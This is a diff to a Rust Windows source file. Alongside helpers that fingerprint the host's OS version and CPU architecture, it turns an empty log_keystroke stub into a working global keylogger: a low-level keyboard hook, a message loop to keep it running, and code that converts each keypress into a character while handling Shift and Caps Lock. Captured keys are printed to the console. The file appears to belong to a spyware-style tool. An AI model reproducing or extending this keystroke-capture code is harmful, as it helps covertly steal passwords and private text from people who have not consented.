@@ -1,4 +1,7 @@
 
+use windows::Win32::Foundation::{
+    HWND, LPARAM, LRESULT, WPARAM
+};
 use windows::Win32::System::SystemInformation::{
     GetSystemInfo,
     SYSTEM_INFO,
@@ -19,6 +22,25 @@ use windows::Win32::System::SystemInformation::{
     PROCESSOR_ARCHITECTURE_PPC,
     PROCESSOR_ARCHITECTURE_SHX,
     PROCESSOR_ARCHITECTURE_UNKNOWN,
+};
+
+use windows::Win32::UI::WindowsAndMessaging::{
+    CallNextHookEx,
+    DispatchMessageW,
+    GetMessageW,
+    SetWindowsHookExA,
+    TranslateMessage,
+    UnhookWindowsHookEx,
+    KBDLLHOOKSTRUCT,
+    MSG,
+    WH_KEYBOARD_LL,
+    WM_KEYDOWN
+
+};
+
+use windows::Win32::UI::Input::KeyboardAndMouse::{
+
+    GetKeyState, GetKeyboardState, MapVirtualKeyA, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
 };
 
 pub fn get_windows_version() -> &'static str{
@@ -58,6 +80,81 @@ fn get_system_arch(arch: PROCESSOR_ARCHITECTURE) ->  &'static str {
     }
 }
 
-pub fn log_keystroke(cmd:& str){
+pub unsafe fn set_windows_hook(){
+    let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();
 
+    println!("Hook is now listenting");
+
+    let mut msg = MSG::default();
+
+        // This keeps the thread alive to receive hook messages
+    while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+
+
+    UnhookWindowsHookEx(hook);
+}
+
+unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT{
+
+    if code >= 0 && wparam.0 as u32 == WM_KEYDOWN  {
+
+        let kb_struct = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
+
+        let vk_code = kb_struct.vkCode;
+
+        println!("Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);
+
+        match vk_code {
+            8 => {println!("[BACKSPACE]");}
+            9 => {println!("[TAB]");}
+            13 => {println!("[ENTER]");}
+            20 => {println!("[CAP]");}
+            27 => {println!("[ESC]");}
+            92 => {println!("[WIN]");}
+            160 => {println!("[L-SHIFT]");}
+            161 => {println!("[R-SHIFT]");}
+            162 => {println!("[L-CTRL]");}
+            163  => {println!("[R-CTRL]");}
+            _ =>{
+                println!("Key pressed: '{}'", vk_code_to_char(vk_code).unwrap());
+            }
+        }
+
+        
+        
+        
+    }
+
+    CallNextHookEx(None, code, wparam, lparam)
+}
+
+unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
+
+    let mut keyboard_state = [0u8;256];
+
+    GetKeyboardState(&mut keyboard_state);
+
+        // Simulate Caps Lock toggle
+    let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
+    if caps != 0 {
+        keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
+    }
+
+    // Simulate Shift pressed
+    let shift = GetKeyState(VK_SHIFT.0 as i32);
+    if (shift as u16) & 0x8000 != 0 {
+        keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
+    }
+
+    let mut char_buf = [0u16; 2];
+
+    let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);
+
+    let result = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
+    
+
+    char::from_u32(char_buf[0] as u32)
 }
